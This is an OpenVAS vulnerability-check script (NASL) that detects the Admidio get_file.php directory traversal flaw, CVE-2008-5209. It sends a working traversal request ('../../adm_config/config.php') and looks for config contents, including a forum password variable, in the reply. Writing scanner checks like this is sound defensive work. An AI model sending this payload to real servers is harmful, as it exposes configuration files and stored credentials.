###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_admidio_remote_dir_trvsl_vuln.nasl 16 2013-10-27 13:09:52Z jan $
#
# Admidio get_file.php Remote File Disclosure Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2008 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attacker to view local files in the
  context of the webserver process.
  Impact Level: Application";
tag_affected = "Admidio Version 1.4.8 and prior.";
tag_insight = "The flaw is due to file parameter in modules/download/get_file.php
  which is not properly sanitized before returning to the user.";
tag_solution = "Upgrade to Version 1.4.9 or later
  http://www.admidio.org/index.php?page=download";
tag_summary = "This host is running Admidio and is prone to Directory Traversal
  Vulnerability.";

if(description)
{
  script_id(800309);
  script_version("$Revision: 16 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2008-12-01 15:31:19 +0100 (Mon, 01 Dec 2008)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2008-5209");
  script_bugtraq_id(29127);
  script_name("Admidio get_file.php Remote File Disclosure Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/5575");
  script_xref(name : "URL" , value : "http://www.admidio.org/forum/viewtopic.php?t=1180");

  script_description(desc);
  script_summary("Check for the Version of Admidio");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2008 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach path (make_list("/admidio", cgi_dirs()))
{
  sndReq = http_get(item:string(path, "/adm_program/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:1);
  if(rcvRes == NULL){
    exit(0);
  }

  if("Admidio Team" >< rcvRes)
  {
    # Get a config.php using Directory Traversal
    dirTra = "/adm_program/modules/download/get_file.php?folder=&file=" +
             "../../adm_config/config.php&default_folder=";
    sndReq = http_get(item:string(path, dirTra), port:port);
    rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:1);
    if(rcvRes == NULL){
      exit(0);
    }

    if('Module-Owner' >< rcvRes && '$g_forum_pw' >< rcvRes){
      security_warning(port);
      exit(0);
    }
  }
}
